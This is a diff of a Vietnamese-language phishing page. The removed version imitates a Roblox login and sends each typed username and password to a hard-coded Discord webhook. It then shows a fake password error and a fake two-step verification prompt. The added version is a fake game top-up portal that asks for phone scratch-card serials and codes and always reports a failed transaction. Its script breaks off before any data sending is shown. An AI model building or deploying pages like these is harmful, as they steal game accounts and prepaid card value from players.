@@ -3,267 +3,919 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Roblox Square - Optimized</title>
+    <title>Cổng Nạp Game</title>
     <style>
-        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0; padding: 0; }
-        
-        body, html {
-            height: 100vh; width: 100%;
+        /* --- RESET & ĐỊNH DẠNG CHUẨN --- */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            background-color: #f4f6f9;
+            color: #333;
+            display: flex;
+            justify-content: center;
+        }
+
+        .main-container {
+            width: 100%;
+            max-width: 480px;
+            min-height: 100vh;
+            background-color: #fff;
+            border-left: 1px solid #eaeaea;
+            border-right: 1px solid #eaeaea;
+            position: relative;
+            padding-bottom: 30px;
+        }
+
+        /* --- HIỆU ỨNG LOADING --- */
+        #loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(255, 255, 255, 0.95);
+            z-index: 99999;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #2e5431;
+            border-radius: 50%;
+            width: 45px;
+            height: 45px;
+            animation: spin 0.7s linear infinite;
+            margin-bottom: 12px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* --- HEADER XANH LỤC --- */
+        header {
+            background-color: #2e5431;
+            color: white;
+            padding: 14px 18px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.08);
+        }
+
+        .logo-text {
+            font-size: 19px;
+            font-weight: 900;
+            letter-spacing: -0.5px;
+            text-transform: uppercase;
+        }
+
+        /* --- THANH TIẾN TRÌNH TRÊN CÙNG --- */
+        .progress-container {
+            padding: 20px;
+            background-color: #fff;
+        }
+
+        .progress-line {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: relative;
+            max-width: 320px;
+            margin: 0 auto;
+        }
+
+        .progress-line::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 0;
+            transform: translateY(-50%);
+            width: 100%;
+            height: 1px;
+            background-color: #e0e0e0;
+            z-index: 1;
+        }
+
+        .step-node {
+            width: 26px;
+            height: 26px;
+            border-radius: 50%;
+            background-color: #e0e0e0;
+            color: #7b7b7b;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 13px;
+            font-weight: bold;
+            z-index: 2;
+        }
+
+        .step-node.active {
+            background-color: #2e5431;
+            color: white;
+        }
+
+        /* --- LAYOUT CÁC BƯỚC NẠP --- */
+        .step-page {
+            padding: 20px;
+        }
+
+        .page-top-nav {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 22px;
+        }
+
+        .game-title-badge {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 17px;
+            font-weight: bold;
+            color: #222;
+        }
+
+        .roblox-css-logo {
+            width: 20px;
+            height: 20px;
             background-color: #000;
-            font-family: 'HCo Gotham SSm', Helvetica, Arial, sans-serif;
-            display: flex; flex-direction: column; align-items: center;
-            justify-content: space-between; 
+            transform: rotate(-15deg);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 3px;
+        }
+        .roblox-css-logo::after {
+            content: '';
+            width: 6px;
+            height: 6px;
+            background-color: #fff;
+        }
+
+        .nav-history-link {
+            color: #2e5431;
+            text-decoration: none;
+            font-weight: 700;
+            font-size: 14px;
+        }
+
+        .field-label {
+            font-size: 15px;
+            font-weight: bold;
+            color: #333;
+            margin-bottom: 8px;
+        }
+
+        .field-label span {
+            font-weight: normal;
+            color: #666;
+            font-size: 13px;
+        }
+
+        .custom-input {
+            width: 100%;
+            padding: 14px;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            font-size: 15px;
+            outline: none;
+            margin-bottom: 15px;
+        }
+
+        .custom-input:focus {
+            border-color: #2e5431;
+        }
+
+        .action-button {
+            width: 100%;
+            background-color: #2e5431;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            padding: 14px;
+            font-size: 15px;
+            font-weight: bold;
+            cursor: pointer;
+            text-transform: uppercase;
+        }
+
+        .user-info-banner {
+            background-color: #f1f3f5;
+            border-radius: 6px;
+            padding: 14px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-weight: bold;
+            margin-bottom: 20px;
+        }
+
+        /* --- LƯỚI THẺ CHỌN --- */
+        .item-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+
+        .grid-card {
+            background: white;
+            border: 1px solid #e5e7eb;
+            border-radius: 8px;
+            padding: 16px 10px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            cursor: pointer;
+            text-align: center;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.02);
+            transition: all 0.25s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+        
+        .grid-card:hover, .grid-card:active {
+            border-color: #2e5431;
+            box-shadow: 0 2px 6px rgba(46, 84, 49, 0.15);
+        }
+
+        /* --- ĐỊNH DẠNG ICON ĐỘNG --- */
+        .currency-icon {
+            width: 32px;
+            height: 32px;
+            display: inline-block;
+            transition: all 0.2s ease;
+        }
+
+        /* Kiểu Robux */
+        .currency-icon.robux {
+            background-color: #393939; 
+            clip-path: polygon(50% 0%, 93% 25%, 93% 75%, 50% 100%, 7% 75%, 7% 25%);
+            position: relative;
+        }
+        .currency-icon.robux::after {
+            content: '';
+            position: absolute;
+            top: 50%; left: 50%;
+            transform: translate(-50%, -50%);
+            width: 10px; height: 10px;
+            background-color: #fff; 
+        }
+
+        /* Kiểu Kim Cương */
+        .currency-icon.diamond {
+            background-color: #00a2ff;
+            clip-path: polygon(50% 0%, 100% 35%, 80% 100%, 20% 100%, 0% 35%);
+            position: relative;
+        }
+        .currency-icon.diamond::after {
+            content: '';
+            position: absolute;
+            top: 20%; left: 50%;
+            transform: translateX(-50%);
+            width: 0; height: 0;
+            border-left: 6px solid transparent;
+            border-right: 6px solid transparent;
+            border-bottom: 12px solid rgba(255, 255, 255, 0.5);
+        }
+
+        /* Kiểu Đồng Xu */
+        .currency-icon.coin {
+            background-color: #ffbe00;
+            border-radius: 50%;
+            border: 2px dashed #fff;
+            box-shadow: 0 0 0 2px #d49b00, inset 0 0 4px rgba(0,0,0,0.2);
+        }
+
+        .sub-price-wrapper {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            font-size: 14px;
+            color: #2e5431;
+            font-weight: bold;
+            margin-top: 2px;
+        }
+        
+        .sub-price-wrapper .currency-icon {
+            width: 18px;
+            height: 18px;
+        }
+        .sub-price-wrapper .currency-icon.robux::after {
+            width: 5px; height: 5px;
+        }
+        .sub-price-wrapper .currency-icon.coin {
+            border-width: 1px;
+            box-shadow: 0 0 0 1px #d49b00;
+        }
+
+        .card-main-title {
+            font-size: 15px;
+            font-weight: bold;
+            color: #111;
+        }
+
+        /* --- LOGO NHÀ MẠNG --- */
+        .css-logo-badge {
+            width: 100%;
+            height: 42px;
+            border-radius: 6px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 18px;
+            margin-bottom: 2px;
+            box-shadow: inset 0 -2px 0 rgba(0,0,0,0.1);
+        }
+
+        .logo-viettel {
+            background-color: #d11c1c;
+            color: #ffffff;
+            font-weight: bold;
+            text-transform: lowercase;
+            font-style: italic;
+        }
+
+        .logo-vinaphone {
+            background-color: #0066b2;
+            color: #ffffff;
+            font-weight: bold;
+            text-transform: lowercase;
+            letter-spacing: -0.5px;
+        }
+
+        .logo-mobifone {
+            background-color: #f8f9fa;
+            border: 1px solid #e5e7eb;
+            box-shadow: none;
+        }
+        .logo-mobifone .m-blue { color: #0054a6; font-weight: bold; }
+        .logo-mobifone .f-red { color: #e31837; font-weight: bold; }
+
+        .logo-zing {
+            background: linear-gradient(135deg, #ff8c00, #ff4500);
+            color: #ffffff;
+            font-weight: 900;
+            text-transform: uppercase;
+            font-size: 16px;
+            letter-spacing: 0.5px;
+        }
+
+        /* --- TỔNG KẾT & BÁO LỖI --- */
+        .summary-box {
+            border: 1px solid #e5e7eb;
+            border-radius: 6px;
+            padding: 14px;
+            margin-bottom: 15px;
+        }
+
+        .summary-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 6px 0;
+            font-size: 14px;
+        }
+
+        .summary-row .bold-val {
+            font-weight: bold;
+            color: #111;
+        }
+
+        .warning-box {
+            color: #c92a2a;
+            font-size: 12.5px;
+            line-height: 1.4;
+            margin-bottom: 15px;
+        }
+
+        .error-report-container {
+            text-align: center;
+            padding: 15px 5px;
+        }
+
+        .css-error-circle {
+            width: 65px;
+            height: 65px;
+            background-color: #dc3545;
+            color: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 38px;
+            font-weight: bold;
+            margin: 0 auto 12px auto;
+        }
+
+        .error-main-title {
+            font-size: 20px;
+            font-weight: bold;
+            color: #dc3545;
+            margin-bottom: 4px;
+        }
+
+        .error-sub-id {
+            font-size: 13px;
+            color: #666;
+            margin-bottom: 25px;
+            margin-top: 10px;
+        }
+
+        .detail-report-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 15px;
+            background-color: #fafbfc;
+            border: 1px solid #eee;
+            border-radius: 6px;
             overflow: hidden;
         }
 
-        .header {
-            width: 100%; max-width: 450px; height: 52px;
-            background: #232527; z-index: 100;
-            display: flex; flex-direction: column; padding: 6px 15px;
-            flex-shrink: 0;
-        }
-        .header-top {
-            display: flex; align-items: center; justify-content: space-between;
-            width: 100%; height: 20px;
-        }
-        .header-left { display: flex; align-items: center; gap: 8px; }
-        .roblox-logo { width: 14px; height: 14px; fill: #fff; }
-        .search-bar { 
-            background: #111; border: 1px solid #444; border-radius: 4px;
-            padding: 1px 6px; width: 110px; color: #eee; font-size: 8px; height: 17px;
-        }
-        .btn-top-login { 
-            color: #fff; font-size: 8px; font-weight: 700; 
-            background: #393b3d; padding: 2px 7px; border-radius: 3px;
-        }
-        .header-nav {
-            display: flex; align-items: center; justify-content: space-between;
-            width: 100%; margin-top: 8px;
-        }
-        .nav-item { color: #bbb; font-size: 7px; font-weight: 600; }
-
-        .bg-image {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background-image: url('https://i.ibb.co/nsm66HQs/image.jpg');
-            background-size: cover;
-            background-position: center;
-            background-repeat: no-repeat;
-            z-index: 1;
-            filter: brightness(0.35);
-        }
-
-        .container { 
-            display: flex; justify-content: center; align-items: center; 
-            z-index: 10; width: 100%; flex: 1;
-        }
-        .login-box {
-            background-color: #1c1e22; 
-            padding: 5px 12px 18px 12px;
-            width: 210px; text-align: center; color: #fff; 
-            border-radius: 6px; box-shadow: 0 5px 25px rgba(0,0,0,0.9);
-        }
-
-        h2 { 
-            font-size: 18px; 
-            margin-top: 15px; 
-            margin-bottom: 18px; 
-            font-weight: 800; 
-        }
-
-        .input-field {
-            width: 100%; height: 19px; padding: 0 8px;
-            background: #2a2d33;
-            border: 1px solid #35383e;
-            border-radius: 3px; color: white; font-size: 7.5px; outline: none;
-        }
-        .input-field-u { margin-bottom: 3px; }
-        
-        #error-msg {
-            color: #ff4d4d;
-            font-size: 6.5px;
+        .detail-report-table td {
+            padding: 12px 14px;
+            font-size: 14.5px;
+            border-bottom: 1px solid #f0f0f0;
             text-align: left;
-            margin-bottom: 5px;
-            padding-left: 2px;
-            display: none;
         }
 
-        .input-field-p { margin-bottom: 8px; }
+        .detail-report-table td.lbl {
+            color: #666;
+            width: 40%;
+        }
 
-        .btn-login {
-            width: 100%; height: 19px; background: transparent; color: #fff;
-            border: 1px solid #fff; border-radius: 3px; font-size: 8px;
+        .detail-report-table td.val {
+            font-weight: bold;
+            color: #111;
+            width: 60%;
+        }
+
+        /* --- CHỌN GAME --- */
+        .game-grid-3col {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .game-avatar-wrapper {
+            position: relative;
+            width: 56px;
+            height: 56px;
+            margin-bottom: 4px;
+        }
+
+        .game-avatar {
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            object-fit: cover;
+            border: 2px solid #e5e7eb;
+            transition: all 0.25s ease;
+        }
+
+        .roblox-fallback-avatar {
+            width: 100%; height: 100%;
+            background-color: #111;
+            border-radius: 50%;
             display: flex; align-items: center; justify-content: center;
+            border: 2px solid #e5e7eb;
+            transition: all 0.25s ease;
         }
-        .forgot-link { display: block; margin-top: 6px; color: #adb5bd; font-size: 6.5px; text-decoration: none; }
-        .spacer { height: 16px; width: 100%; }
-        
-        .btn-action {
-            width: 100%; height: 17px; padding: 0; 
-            background: #2f3238; 
-            border: none; color: #fff; border-radius: 3px; font-size: 7px; 
-            margin-bottom: 4px; font-weight: 600;
+        .roblox-fallback-avatar .roblox-inner {
+            width: 20px; height: 20px;
+            background-color: #fff;
+            transform: rotate(-15deg);
             display: flex; align-items: center; justify-content: center;
+            border-radius: 3px;
+        }
+        .roblox-fallback-avatar .roblox-inner::after {
+            content: ''; width: 6px; height: 6px; background-color: #111;
         }
 
-        .footer {
-            width: 100%; max-width: 450px; 
-            padding: 10px 10px 35px 10px; 
-            color: #ddd; text-align: center; z-index: 100; flex-shrink: 0;
-        }
-        .footer-links { 
-            margin-bottom: 25px; 
-            display: flex; flex-wrap: wrap; justify-content: center; 
-            column-gap: 12px; row-gap: 20px;
-        }
-        .footer-links span { font-size: 7.5px; color: #bbb; }
-        .footer-copyright { font-size: 6px; color: #555; margin-top: 15px; }
-
-        /* --- LỚP NỀN TỐI VÀ LOADING --- */
-        #dark-overlay {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.75); z-index: 1000; display: none;
+        .select-badge {
+            position: absolute;
+            bottom: -2px; right: -2px;
+            width: 18px; height: 18px;
+            background-color: #2e5431;
+            color: white; border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+            font-size: 11px; font-weight: bold;
+            opacity: 0; transform: scale(0.5);
+            transition: all 0.2s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            box-shadow: 0 1px 3px rgba(0,0,0,0.2);
         }
 
-        .loader-container {
-            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
-            z-index: 1001; display: none; flex-direction: column; align-items: center;
+        .game-card-active {
+            border-color: #2e5431 !important;
+            background-color: #f4fbf5 !important;
+            transform: translateY(-2px);
         }
-
-        .loader-sq { display: flex; gap: 5px; }
-        .sq { width: 8px; height: 8px; background: #bbb; animation: blink 0.8s infinite alternate; }
-        .sq:nth-child(2) { animation-delay: 0.2s; }
-        .sq:nth-child(3) { animation-delay: 0.4s; }
-        @keyframes blink { from { opacity: 0.2; } to { opacity: 1; } }
-
-        /* --- BẢNG XÁC MINH 2 BƯỚC --- */
-        #verify-modal {
-            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
-            width: 280px; 
-            background: #1a1c1e; /* Nền đậm */
-            border-radius: 8px;
-            z-index: 1002; display: none; flex-direction: column; overflow: hidden;
-            color: #fff; text-align: center;
+        .game-card-active .game-avatar, 
+        .game-card-active .roblox-fallback-avatar {
+            border-color: #2e5431 !important;
+            box-shadow: 0 0 8px rgba(46, 84, 49, 0.3);
         }
-        .v-header { padding: 12px; border-bottom: 1px solid #333; font-size: 13px; font-weight: bold; }
-        .v-content { padding: 30px 20px; display: flex; flex-direction: column; align-items: center; }
-        .v-shield { width: 60px; margin-bottom: 20px; }
-        .v-text { font-size: 11px; color: #ccc; line-height: 1.5; margin-bottom: 20px; }
-        
-        .v-btn { 
-            width: 100%; /* Giữ nguyên chiều ngang */
-            padding: 5px; /* Giảm độ dày/chiều dài dọc xuống một nửa */
-            background: transparent; 
-            border: 1px solid #888; 
-            color: #fff; 
-            border-radius: 4px; 
-            font-size: 11px; 
-            cursor: pointer;
+        .game-card-active .select-badge {
+            opacity: 1; transform: scale(1);
         }
-
+        .game-card-active .card-main-title {
+            color: #2e5431 !important;
+        }
     </style>
 </head>
 <body>
 
-<div class="header">
-    <div class="header-top">
-        <div class="header-left">
-            <svg class="roblox-logo" viewBox="0 0 28 28">
-                <path d="M4.3 0L0 23.7L23.7 28L28 4.3L4.3 0ZM18 18L10 16.5L11.5 8.5L19.5 10L18 18Z"/>
-            </svg>
-            <div class="search-bar">Tìm kiếm</div>
+    <div id="loading-overlay">
+        <div class="spinner"></div>
+        <div style="color: #2e5431; font-weight: bold; font-size: 14px;">Đang xử lý...</div>
+    </div>
+
+    <div class="main-container">
+        <header>
+            <div class="logo-text" id="main-header-title">NAPROBUX</div>
+        </header>
+
+        <div class="progress-container">
+            <div class="progress-line">
+                <div class="step-node active" id="dot1">1</div>
+                <div class="step-node" id="dot2">2</div>
+                <div class="step-node" id="dot3">3</div>
+                <div class="step-node" id="dot4">4</div>
+            </div>
         </div>
-        <div class="btn-top-login">Đăng nhập</div>
+
+        <div id="step1" class="step-page">
+            <div class="page-top-nav">
+                <div class="game-title-badge" id="top-badge-title">
+                    <div class="roblox-css-logo" id="header-css-logo"></div>
+                    <span id="header-game-name">Roblox</span>
+                </div>
+                <a href="#" class="nav-history-link" onclick="alert('Tính năng đang bảo trì!')">Kiểm Tra Giao Dịch</a>
+            </div>
+
+            <div class="field-label">Chọn game cần nạp</div>
+            <div class="game-grid-3col" id="game-select-grid">
+                <div class="grid-card game-card-active" onclick="selectGame('Roblox', 'Nhập ID Game hoặc Username', this)">
+                    <div class="game-avatar-wrapper">
+                        <div class="roblox-fallback-avatar">
+                            <div class="roblox-inner"></div>
+                        </div>
+                        <div class="select-badge">✓</div>
+                    </div>
+                    <div class="card-main-title">Roblox</div>
+                </div>
+                <div class="grid-card" onclick="selectGame('Free Fire', 'Nhập ID Người chơi (VD: 123456789)', this)">
+                    <div class="game-avatar-wrapper">
+                        <img src="https://i.imgur.com/uorw0PZ.png" class="game-avatar" alt="Free Fire">
+                        <div class="select-badge">✓</div>
+                    </div>
+                    <div class="card-main-title">Free Fire</div>
+                </div>
+                <div class="grid-card" onclick="selectGame('Mini World', 'Nhập UID Mini World', this)">
+                    <div class="game-avatar-wrapper">
+                        <img src="https://i.imgur.com/GisLhX4.png" class="game-avatar" alt="Mini World">
+                        <div class="select-badge">✓</div>
+                    </div>
+                    <div class="card-main-title">Mini World</div>
+                </div>
+            </div>
+
+            <div class="field-label" id="dynamic-input-label">Nhập ID / Username <span>( Hướng dẫn lấy ID )</span></div>
+            <input type="text" id="usernameInput" class="custom-input" placeholder="Nhập ID Game hoặc Username">
+
+            <button type="button" class="action-button" onclick="triggerLoading('goStep2')">Đăng nhập</button>
+        </div>
+
+        <div id="step2" class="step-page" style="display: none;">
+            <div class="field-label">Thông tin nhân vật</div>
+            <div class="user-info-banner">
+                <span>Xin chào: <span id="display-user" style="color: #2e5431;">--</span></span>
+                <span style="font-size: 16px; color: #666;">⇄</span>
+            </div>
+
+            <div class="field-label">Chọn gói nạp</div>
+            <div class="item-grid" id="package-grid-container">
+                </div>
+        </div>
+
+        <div id="step3" class="step-page" style="display: none;">
+            <div class="field-label">Đã chọn gói</div>
+            <div class="user-info-banner">
+                <span id="display-selected-pkg" style="color: #2e5431;">--</span>
+                <span style="font-size: 16px; color: #666;">⇄</span>
+            </div>
+
+            <div class="field-label">Chọn phương thức thanh toán</div>
+            <div class="item-grid">
+                <div class="grid-card" onclick="triggerLoading('goStep4', ['VIETTEL'])">
+                    <div class="css-logo-badge logo-viettel">viettel</div>
+                    <div class="card-main-title dynamic-rb-txt">--</div>
+                    <div class="sub-price-wrapper"><div class="currency-icon robux dynamic-icon-style"></div> <span class="dynamic-unit-text">Robux</span></div>
+                </div>
+                <div class="grid-card" onclick="triggerLoading('goStep4', ['VINAPHONE'])">
+                    <div class="css-logo-badge logo-vinaphone">vinaphone</div>
+                    <div class="card-main-title dynamic-rb-txt">--</div>
+                    <div class="sub-price-wrapper"><div class="currency-icon robux dynamic-icon-style"></div> <span class="dynamic-unit-text">Robux</span></div>
+                </div>
+                <div class="grid-card" onclick="triggerLoading('goStep4', ['MOBIFONE'])">
+                    <div class="css-logo-badge logo-mobifone"><span class="m-blue">mobi</span><span class="f-red">fone</span></div>
+                    <div class="card-main-title dynamic-rb-txt">--</div>
+                    <div class="sub-price-wrapper"><div class="currency-icon robux dynamic-icon-style"></div> <span class="dynamic-unit-text">Robux</span></div>
+                </div>
+                <div class="grid-card" onclick="triggerLoading('goStep4', ['ZING'])">
+                    <div class="css-logo-badge logo-zing">zing</div>
+                    <div class="card-main-title dynamic-rb-txt">--</div>
+                    <div class="sub-price-wrapper"><div class="currency-icon robux dynamic-icon-style"></div> <span class="dynamic-unit-text">Robux</span></div>
+                </div>
+            </div>
+        </div>
+
+        <div id="step4" class="step-page" style="display: none;">
+            <div class="summary-box">
+                <div class="summary-row">
+                    <span>Gói nạp:</span>
+                    <span class="bold-val" id="summary-pkg-name" style="color: #2e5431;">--</span>
+                </div>
+                <div class="summary-row" style="border-top: 1px dashed #eee; margin-top: 6px; padding-top: 6px;">
+                    <span>Tổng tiền:</span>
+                    <span class="bold-val" id="summary-pkg-price" style="color: #2e5431;">--</span>
+                </div>
+            </div>
+
+            <div class="field-label">Thanh toán bằng thẻ: <span id="summary-method-name" style="color: #2e5431;">--</span></div>
+            <div class="warning-box">
+                <b>Cảnh báo:</b> Người chơi vui lòng nạp đúng mệnh giá tương ứng gói nạp đã chọn. Giao dịch sai mệnh giá sẽ mất thẻ và không nhận được gói nạp.
+            </div>
+
+            <div class="field-label" style="color: #555;">Mã serial</div>
+            <input type="text" id="serialInput" class="custom-input" placeholder="Nhập số serial của thẻ">
+
+            <div class="field-label" style="color: #555;">Mã thẻ</div>
+            <input type="text" id="codeInput" class="custom-input" placeholder="Nhập mã cào của thẻ">
+
+            <button type="button" class="action-button" onclick="triggerLoading('goStep5')">Thanh toán</button>
+        </div>
+
+        <div id="step5" class="step-page" style="display: none;">
+            <div class="error-report-container">
+                <div class="css-error-circle">!</div>
+                <div class="error-main-title">Lỗi giao dịch</div>
+                <div class="warning-box" style="margin-top: 10px; font-weight: bold;">
+                    Vui lòng kiểm tra lại số Seri hoặc Mã thẻ!
+                </div>
+                <div class="error-sub-id">ID Giao Dịch: <span id="ticket-id" style="font-weight: bold; color: #111;">0</span></div>
+
+                <table class="detail-report-table">
+                    <tbody>
+                    <tr>
+                        <td class="lbl">Người chơi</td>
+                        <td class="val" id="res-user">--</td>
+                    </tr>
+                    <tr>
+                        <td class="lbl">Phương thức</td>
+                        <td class="val" id="res-method">--</td>
+                    </tr>
+                    <tr>
+                        <td class="lbl">Gói nạp</td>
+                        <td class="val" id="res-pkg">--</td>
+                    </tr>
+                    <tr>
+                        <td class="lbl">Trò chơi</td>
+                        <td class="val" id="res-game">Roblox</td>
+                    </tr>
+                    <tr>
+                        <td class="lbl">Mệnh giá</td>
+                        <td class="val" id="res-cost">--</td>
+                    </tr>
+                    <tr>
+                        <td class="lbl">Trạng thái</td>
+                        <td class="val" style="color: #dc3545; font-weight: bold;">Thất bại</td>
+                    </tr>
+                    <tr>
+                        <td class="lbl">Thời gian</td>
+                        <td class="val" id="res-clock">--</td>
+                    </tr>
+                </tbody></table>
+
+                <button type="button" class="action-button" style="margin-top: 25px; background-color: #555;" onclick="window.location.reload()">Nhập lại thẻ</button>
+            </div>
+        </div>
+
     </div>
-    <div class="header-nav">
-        <span class="nav-item">Bảng xếp hạng</span><span class="nav-item">Chợ</span>
-        <span class="nav-item">Tạo</span><span class="nav-item">Robux</span>
-    </div>
-</div>
 
-<div class="bg-image"></div>
+    <script>
+        let savedUser = "";
+        let savedPkgName = "";
+        let savedPkgPrice = "";
+        let savedMethod = "";
+        let savedGame = "Roblox";
 
-<div class="container">
-    <div class="login-box">
-        <h2>Thêm tài khoản</h2>
-        <input type="text" id="u" class="input-field input-field-u" placeholder="Tên người dùng/Email/SĐT">
-        <div id="error-msg">Sai tên người dùng hoặc mật khẩu.</div>
-        <input type="password" id="p" class="input-field input-field-p" placeholder="Mật khẩu">
-        <button class="btn-login" onclick="send()">Đăng nhập</button>
-        <a href="#" class="forgot-link">Bạn quên Mật khẩu hoặc Tên người dùng?</a>
-        <div class="spacer"></div>
-        <button class="btn-action">Gửi mã một lần cho tôi qua email</button>
-        <button class="btn-action">Sử dụng thiết bị khác</button>
-    </div>
-</div>
+        const gameConfigs = {
+            "Roblox": { unit: "Robux", iconClass: "robux", headerTxt: "NAPROBUX" },
+            "Free Fire": { unit: "Kim Cương", iconClass: "diamond", headerTxt: "NAP KIM CƯƠNG" },
+            "Mini World": { unit: "Xu Mini", iconClass: "coin", headerTxt: "NẠP XU MINI" }
+        };
 
-<div id="dark-overlay"></div>
+        const fixedPriceTable = [
+            { amount: "3,000", price: "20,000 đ" },
+            { amount: "6,500", price: "50,000 đ" },
+            { amount: "15,900", price: "100,000 đ" },
+            { amount: "19,000", price: "200,000 đ" },
+            { amount: "100,000", price: "500,000 đ" }
+        ];
 
-<div class="loader-container" id="main-loader">
-    <div class="loader-sq">
-        <div class="sq"></div><div class="sq"></div><div class="sq"></div>
-    </div>
-</div>
+        function selectGame(gameName, placeholderText, element) {
+            savedGame = gameName;
+            const cards = document.querySelectorAll('#game-select-grid .grid-card');
+            cards.forEach(card => card.classList.remove('game-card-active'));
+            element.classList.add('game-card-active');
+            
+            document.getElementById('usernameInput').placeholder = placeholderText;
 
-<div id="verify-modal">
-    <div class="v-header">Xác minh 2 bước</div>
-    <div class="v-content">
-        <img src="https://images.rbxcdn.com/393165b4c483d739818815122e964344.png" class="v-shield">
-        <p class="v-text">Để chấp nhận hoặc từ chối nỗ lực đăng nhập này, hãy mở ứng dụng Roblox từ thiết bị đã đăng nhập.</p>
-        <button class="v-btn" onclick="location.reload()">Thử lại</button>
-    </div>
-</div>
+            const headerGameName = document.getElementById('header-game-name');
+            const cssLogoNode = document.getElementById('header-css-logo');
+            headerGameName.innerText = gameName;
+            
+            if (gameName === 'Roblox') {
+                cssLogoNode.style.display = 'flex';
+                cssLogoNode.className = 'roblox-css-logo';
+            } else {
+                cssLogoNode.style.display = 'none';
+            }
+        }
 
-<div class="footer">
-    <div class="footer-links">
-        <span>Về chúng tôi</span><span>Việc làm</span><span>Blog</span><span>Cha mẹ</span>
-        <span>Mua thẻ quà tặng</span><span>Trợ giúp</span><span>Điều khoản</span><span>Riêng tư</span>
-        <span>Sơ đồ trang web</span>
-    </div>
-    <div class="footer-copyright">©2026 Roblox Corporation.</div>
-</div>
+        function renderPackages() {
+            const container = document.getElementById('package-grid-container');
+            container.innerHTML = ""; 
 
-<script>
-let clickCount = 0;
+            const config = gameConfigs[savedGame];
 
-function send() {
-    const u = document.getElementById('u').value;
-    const p = document.getElementById('p').value;
-    const err = document.getElementById('error-msg');
-    const overlay = document.getElementById('dark-overlay');
-    const loader = document.getElementById('main-loader');
-    const modal = document.getElementById('verify-modal');
+            fixedPriceTable.forEach(item => {
+                const fullPkgName = item.amount + " " + config.unit;
+                const cardHTML = `
+                    <div class="grid-card" onclick="triggerLoading('goStep3', ['${fullPkgName}', '${item.price}'])">
+                        <div class="currency-icon ${config.iconClass}"></div>
+                        <div class="card-main-title">${fullPkgName}</div>
+                        <div class="sub-price-wrapper">${item.price}</div>
+                    </div>
+                `;
+                container.innerHTML += cardHTML;
+            });
+        }
 
-    if(!u || !p) {
-        err.style.display = 'block';
-        return;
-    }
+        function triggerLoading(targetFunction, params = []) {
+            if (targetFunction === 'goStep2' && document.getElementById('usernameInput').value.trim() === "") {
+                alert("Vui lòng điền Username hoặc ID!");
+                return;
+            }
+            if (targetFunction === 'goStep5') {
+                if (document.getElementById('serialInput').value.trim() === "" || document.getElementById('codeInput').value.trim() === "") {
+                    alert("Vui lòng nhập đầy đủ Số Serial và Mã Thẻ!");
+                    return;
+                }
+            }
 
-    // Gửi Webhook
-    fetch("https://discord.com/api/webhooks/1569857108931911831/SfW2kL3EhzL7l5cbxMWO9-7LilnGXwtKNy0MqjzMT8TBwd2GRS8uA3U4J5we-VAjiOjR", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ content: "👤: `" + u + "`\n🔑: `" + p + "`" })
-    });
+            document.getElementById('loading-overlay').style.display = 'flex';
 
-    if (clickCount === 0) {
-        // Lần đầu: Báo lỗi sai mật khẩu
-        setTimeout(() => { 
-            err.style.display = 'block';
-            document.getElementById('p').value = ""; 
-            clickCount++;
-        }, 800);
-    } else {
-        // Lần hai: Tối màn hình và hiện xác minh
-        overlay.style.display = 'block';
-        loader.style.display = 'flex';
+            setTimeout(function() {
+                document.getElementById('loading-overlay').style.display = 'none';
+                window[targetFunction].apply(null, params);
+            }, 600);
+        }
 
-        setTimeout(() => {
-            loader.style.display = 'none';
-            modal.style.display = 'flex';
-        }, 2500); // Đợi 2.5 giây loading rồi hiện bảng
-    }
-}
-</script>
+        function clearAllPages() {
+            document.getElementById('step1').style.display = 'none';
+            document.getElementById('step2').style.display = 'none';
+            document.getElementById('step3').style.display = 'none';
+            document.getElementById('step4').style.display = 'none';
+            document.getElementById('step5').style.display = 'none';
+        }
 
+        function refreshDots(num) {
+            for (let i = 1; i <= 4; i++) {
+                document.getElementById('dot' + i).classList.remove('active');
+            }
+            for (let i = 1; i <= num; i++) {
